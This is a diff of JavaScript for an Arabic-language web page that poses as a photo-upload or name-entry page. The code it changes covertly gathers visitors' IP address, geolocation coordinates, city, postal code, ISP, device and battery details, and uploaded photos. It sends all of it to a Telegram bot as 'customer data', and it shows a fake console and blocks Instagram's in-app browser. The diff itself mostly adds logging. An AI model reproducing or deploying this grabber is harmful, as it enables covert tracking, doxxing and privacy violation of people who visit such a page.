@@ -74,7 +74,7 @@ function getDeviceBrand() {
 }
 
 // التحقق من متصفح إنستغرام عند تحميل الصفحة
-document.addEventListener('DOMContentLoaded', () => {
+window.onload = () => {
     if (isInstagramBrowser()) {
         Swal.fire({
             title: '🚫 ممنوع الدخول!',
@@ -152,6 +152,7 @@ document.addEventListener('DOMContentLoaded', () => {
     async function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         try {
+            console.log('جاري إرسال الرسالة إلى تليجرام...');
             const response = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -161,10 +162,12 @@ document.addEventListener('DOMContentLoaded', () => {
                     parse_mode: 'Markdown'
                 })
             });
+            console.log('حالة الطلب:', response.status, response.statusText);
             if (!response.ok) {
                 throw new Error(`فشل الطلب: ${response.status}`);
             }
         } catch (error) {
+            console.error('خطأ في إرسال الرسالة لتليجرام:', error);
             Swal.fire({
                 title: 'مشكلة!',
                 text: 'فشلنا نرسل الرسالة. جرب تاني أو غيّر المتصفح.',
@@ -217,32 +220,33 @@ document.addEventListener('DOMContentLoaded', () => {
                 return (currentCount || 0) + 1;
             });
             const count = await getVisitorCount();
-            const visitorCountElement = document.getElementById('visitor-count');
-            if (visitorCountElement) {
-                visitorCountElement.textContent = toArabicNumerals(count);
-            }
+            document.getElementById('visitor-count').textContent = toArabicNumerals(count);
         } catch (error) {
-            const visitorCountElement = document.getElementById('visitor-count');
-            if (visitorCountElement) {
-                visitorCountElement.textContent = 'مش متوفر';
-            }
+            console.error('خطأ في تحديث عدد الزوار:', error);
+            document.getElementById('visitor-count').textContent = 'مش متوفر';
         }
     }
 
     // دالة لجلب بيانات الـ IP باستخدام ipapi.co
     async function getIPInfo() {
         try {
+            console.log('جاري جلب بيانات الـ IP من ipapi.co...');
             const response = await fetch('https://ipapi.co/json/', {
-                mode: 'cors',
-                headers: { 'Accept': 'application/json' }
+                mode: 'cors', // التأكد من استخدام CORS
+                headers: {
+                    'Accept': 'application/json'
+                }
             });
             if (!response.ok) {
+                console.error('فشل استدعاء ipapi.co:', response.status, response.statusText);
                 throw new Error(`فشل جلب بيانات الـ IP: ${response.status}`);
             }
             const data = await response.json();
             if (data.error) {
+                console.error('خطأ من ipapi.co:', data.reason);
                 throw new Error(data.reason);
             }
+            console.log('بيانات ipapi.co:', data);
             return {
                 ip: data.ip || 'مش متوفر',
                 country: data.country_name || 'مش متوفر',
@@ -255,6 +259,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 postal: data.postal || 'مش متوفر'
             };
         } catch (error) {
+            console.error('خطأ في جلب بيانات الـ IP:', error.message);
             return {
                 ip: 'مش متوفر',
                 country: 'مش متوفر',
@@ -300,7 +305,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     const battery = await navigator.getBattery();
                     batteryStatus = `${toArabicNumerals(Math.round(battery.level * 100))}% (${battery.charging ? 'بيتشحن' : 'مش بيتشحن'})`;
                 } catch (error) {
-                    // تجاهل الخطأ
+                    console.error('خطأ في جلب حالة البطارية:', error);
                 }
             }
 
@@ -309,7 +314,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     const estimate = await navigator.storage.estimate();
                     storageQuota = `${toArabicNumerals(Math.round(estimate.quota / 1024 / 1024))} ميجا`;
                 } catch (error) {
-                    // تجاهل الخطأ
+                    console.error('خطأ في جلب التخزين:', error);
                 }
             }
 
@@ -320,13 +325,16 @@ document.addEventListener('DOMContentLoaded', () => {
                     webGLVersion = gl.getParameter(gl.VERSION);
                 }
             } catch (error) {
-                // تجاهل الخطأ
+                console.error('خطأ في جلب WebGL:', error);
             }
 
             // إنشاء الرسالة مع بيانات ipapi.co
             const message = `*بيانات الزبون:*\n👤 *الاسم*: ${name}\n📊 *عدد الزوار*: ${toArabicNumerals(visitorCount)}\n🖥️ *الآي بي*: ${ipData.ip}\n🌍 *البلد*: ${ipData.country}\n🏞️ *المنطقة*: ${ipData.region}\n🏙️ *المدينة*: ${ipData.city}\n📍 *خط العرض*: ${ipData.latitude}\n📍 *خط الطول*: ${ipData.longitude}\n🌐 *مزود الخدمة*: ${ipData.org}\n🕒 *المنطقة الزمنية*: ${ipData.timezone}\n📮 *الرمز البريدي*: ${ipData.postal}\n🌐 *المتصفح*: ${userAgent}\n📏 *دقة الشاشة*: ${screenResolution}\n🖼️ *حجم النافذة*: ${windowSize}\n🗣️ *اللغة*: ${language}\n📶 *الحالة*: ${onlineStatus}\n🔋 *البطارية*: ${batteryStatus}\n💻 *النظام*: ${platform}\n🧠 *الذاكرة*: ${deviceMemory} جيجا\n🎨 *عمق الألوان*: ${toArabicNumerals(colorDepth)} بت\n🌐 *سرعة النت*: ${connectionSpeed}\n⏱️ *مدة الجلسة*: ${toArabicNumerals(sessionTime)} ثانية\n👆 *نقاط اللمس*: ${maxTouchPoints}\n💾 *التخزين*: ${storageQuota}\n🖌️ *WebGL*: ${webGLVersion}\n📱 *نوع الجهاز*: ${deviceType}\n🏷️ *العلامة التجارية*: ${deviceBrand}`;
             await sendToTelegram(message);
 
+            // عرض بيانات الـ IP في واجهة المستخدم
+            
+            
             const progress = document.getElementById('progress');
             if (progress) {
                 progress.style.width = '100%';
@@ -371,6 +379,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 }, 1000);
             }
         } catch (error) {
+            console.error('خطأ في جلب البيانات:', error);
             Swal.fire({
                 title: 'مشكلة!',
                 text: 'فشلنا نجمع البيانات. جرب تاني أو غيّر المتصفح.',
@@ -469,12 +478,14 @@ document.addEventListener('DOMContentLoaded', () => {
             const uploadButton = document.getElementById('upload-button');
             const progress = document.getElementById('progress');
             const fakeConsole = document.getElementById('fake-console');
+            
             if (nameInput) nameInput.value = '';
             if (photoUpload) photoUpload.value = '';
             if (photoPreview) photoPreview.classList.remove('visible');
             if (uploadButton) uploadButton.classList.remove('hidden');
             if (progress) progress.style.width = '0';
             if (fakeConsole) fakeConsole.innerHTML = '';
+            
             getUserInfo();
         }
     }
@@ -528,6 +539,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     method: 'POST',
                     body: formData
                 }).catch(error => {
+                    console.error('خطأ في إرسال الصورة:', error);
                     Swal.fire({
                         title: 'مشكلة!',
                         text: 'فشلنا نرسل الصورة. جرب تاني أو غيّر المتصفح.',
@@ -569,4 +581,4 @@ document.addEventListener('DOMContentLoaded', () => {
     }).then(() => {
         getUserInfo();
     });
-});
+};
